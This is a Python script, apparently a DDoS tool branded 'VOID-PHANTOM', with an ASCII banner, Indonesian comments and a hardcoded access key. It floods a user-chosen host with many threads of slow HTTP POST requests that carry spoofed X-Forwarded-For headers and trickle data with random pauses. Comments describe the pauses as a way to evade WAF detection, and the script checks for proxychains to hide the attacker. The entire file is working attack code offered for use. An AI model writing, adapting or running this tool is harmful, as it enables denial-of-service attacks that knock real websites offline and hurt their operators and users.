import socket
import os
import sys
import time
import threading
import random
import string
import math
import ssl

# --- UI VOID TEAM ---
def rgb_text(text, offset):
    colored_chars = []
    FREQ = 0.1
    for i, char in enumerate(text):
        if char == '\n':
            colored_chars.append('\n')
            continue
        r = int(math.sin(FREQ * i + offset) * 127 + 128)
        g = int(math.sin(FREQ * i + offset + 2) * 127 + 128)
        b = int(math.sin(FREQ * i + offset + 4) * 127 + 128)
        colored_chars.append(f"\033[38;2;{r};{g};{b}m{char}")
    return "".join(colored_chars) + "\033[0m"

def get_logo():
    return r"""
 ░▒▓██████▓▒░      ▄▄██████▄▄      ░▒▓██████▓▒░
 ░▒▓██▓▒░        ▄████████████▄        ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▀▄ ▓▓ ▄▀ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▓▓ ▼▼ ▓▓ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░        ▀████████████▀        ░▒▓██▓▒░
  ░▒▓██▓▒░         ▀▀██████▀▀         ░▒▓██▓▒░
 
        ╔══════════════════════════════════╗
        ║    V O I D - P H A N T O M       ║
        ╚══════════════════════════════════╝
           [ MODE: STEALTH NUCLEAR / APT ]
    """

total_impact = 0

def phantom_engine(target, port, ssl_on):
    global total_impact
    try:
        ip = socket.gethostbyname(target)
    except: return

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            s.connect((ip, port))

            # --- TEKNIK PHANTOM: STUTTERING PAYLOAD ---
            # Kita kirim header yang valid tapi berat
            rnd_path = ''.join(random.choices(string.ascii_lowercase, k=10))
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=1024))
            
            header = (
                f"POST /{rnd_path}?{random.randint(1,9999)} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(110,122)}.0.0.0\r\n"
                f"Content-Length: 5000\r\n" # Janji payload besar
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.send(header.encode())

            # Mengirim data secara "Stutter" (Gagap)
            # Ini yang bikin STEALTH: Mengirim potongan kecil lalu diam
            for _ in range(5):
                s.send(payload.encode())
                total_impact += 1
                # Diam secara acak untuk menghindari deteksi pola WAF
                time.sleep(random.uniform(1.5, 3.0))
            
            s.close()
        except: pass

def run_ddos(key):
    if key != "VOID_ACCESS_GRANTED_2026": return
    os.system('clear')
    print(rgb_text(get_logo(), 5))
    
    # Check Proxychains
    is_proxy = "proxychains" in os.environ.get("_", "")
    status_text = "\033[1;32m[✓] GHOST MODE ACTIVE\033[0m" if is_proxy else "\033[1;33m[!] DIRECT MODE (LOUD)\033[0m"
    print(f" {status_text}")

    target = input("\n [?] Target Host/IP: ").strip()
    port = int(input(" [?] Port (80/443): ") or 443)
    threads = int(input(" [?] Threads (Phantom Rec: 150): ") or 150)
    
    print(f"\n [!] INFILTRATING {target} WITH PHANTOM DOOM...")
    for _ in range(threads):
        threading.Thread(target=phantom_engine, args=(target, port, port==443), daemon=True).start()

    while True:
        try:
            sys.stdout.write(f"\r [★] Impact Units: {total_impact} | Status: PHANTOM STRESSING...")
            sys.stdout.flush()
            time.sleep(1)
        except KeyboardInterrupt: break
